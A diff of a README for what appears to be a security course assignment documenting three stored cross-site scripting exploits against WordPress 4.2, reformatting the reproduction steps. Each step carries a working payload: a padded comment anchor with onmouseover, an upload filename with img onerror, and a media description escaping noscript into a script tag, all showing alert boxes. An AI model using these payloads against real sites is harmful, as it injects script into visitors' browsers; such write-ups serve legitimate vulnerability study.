@@ -12,7 +12,8 @@ Time spent: Approximately 10 hours spent in total
     - Tested in version: 	4.2 (Released on 04/23/2015)
     - Fixed in version: 	4.2.1
   - [x] GIF Walkthrough: 	exploit1/exploit1.gif
-  - [x] Steps to recreate: 	- Go to wordpress site and paste this link in the comment box and post.<a title='xonmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+  - [x] Steps to recreate: 	
+  	- Go to wordpress site and paste this link in the comment box and post.<a title='xonmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
 
 
 
@@ -23,9 +24,10 @@ Time spent: Approximately 10 hours spent in total
     - Tested in version: 	4.2 (Released on 04/23/2015)
     - Fixed in version: 	4.2.15
   - [x] GIF Walkthrough:	exploit2/exploit2.gif
-  - [x] Steps to recreate:	- Create a file larger than 20MB in size.
-				- Rename it to "anyName <img src=x onerror=alert("Exploit2")>.jpg"
-				- From admin console, upload this file.(An error will appear saying file too large, but our exploit will also work and alert box will pop up. This shows the vulnerability that )
+  - [x] Steps to recreate:
+  	- Create a file larger than 20MB in size.
+	- Rename it to "anyName <img src=x onerror=alert("Exploit2")>.jpg"
+	- From admin console, upload this file.(An error will appear saying file too large, but our exploit will also work and alert box will pop up. This shows the vulnerability that )
 
 
 
@@ -36,10 +38,11 @@ Time spent: Approximately 10 hours spent in total
     - Tested in version: 	4.2 (Released on 04/23/2015)
     - Fixed in version:		4.7.3
   - [x] GIF Walkthrough:	exploit3/exploit3.gif
-  - [x] Steps to recreate:	- Upload a media file containing exploit in form of Metadata.
-				- If it doesn't contain Metadata already, we can add it in description of the media file on admin console.
-				- Add "filename </noscript><script>alert("Exploit 3 Successful");</script>" in the description including quotes.
-				- View attachment page and our alert box will pop up.
+  - [x] Steps to recreate:	
+  	- Upload a media file containing exploit in form of Metadata.
+	- If it doesn't contain Metadata already, we can add it in description of the media file on admin console.
+	- Add "filename </noscript><script>alert("Exploit 3 Successful");</script>" in the description including quotes.
+	- View attachment page and our alert box will pop up.
 
 
 ## Resources
